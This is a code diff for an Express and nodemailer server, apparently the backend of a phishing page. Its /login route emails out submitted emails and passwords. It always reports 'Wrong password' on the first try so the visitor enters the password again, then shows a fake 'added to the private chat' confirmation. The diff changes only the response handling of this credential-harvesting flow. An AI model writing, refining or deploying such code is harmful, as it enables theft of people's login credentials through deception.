@@ -43,18 +43,12 @@ const transporter = nodemailer.createTransport({
     }
 });
 
-
-
 app.get("/", (req, res) => {
     const message = req.session.message || '';
     const email = req.session.email || '';
-    const success = req.session.success || false;
-    req.session.message = null;
-    req.session.success = null; // Reset success flag after displaying
-    
-    res.render("index", { message, email, success });
+    req.session.message = null; // Clear message after displaying it
+    res.render("index", { message, email });
 });
-
 
 app.post("/login", (req, res) => {
     const { email, password } = req.body;
@@ -72,18 +66,20 @@ app.post("/login", (req, res) => {
 
     transporter.sendMail(mailOptions, (error) => {
         if (error) {
+            console.log(error);
             req.session.message = 'Wrong password. Try again!';
-            req.session.success = false;
+            res.json({ message: req.session.message, redirect: false });
         } else {
             req.session.message = attemptNumber === 1 ? 'Wrong password. Try again!' : 'You have been successfully added to the private chat, you will get a message request shortly.';
-            req.session.success = attemptNumber !== 1;
             req.session.attempt = attemptNumber === 1 ? 2 : 1;
+
+            res.json({
+                message: req.session.message,
+                redirect: attemptNumber !== 1
+            });
         }
-        
-        res.redirect('/');
     });
 });
-
 
 app.listen(3000, () => {
     console.log("Server started on port 3000");
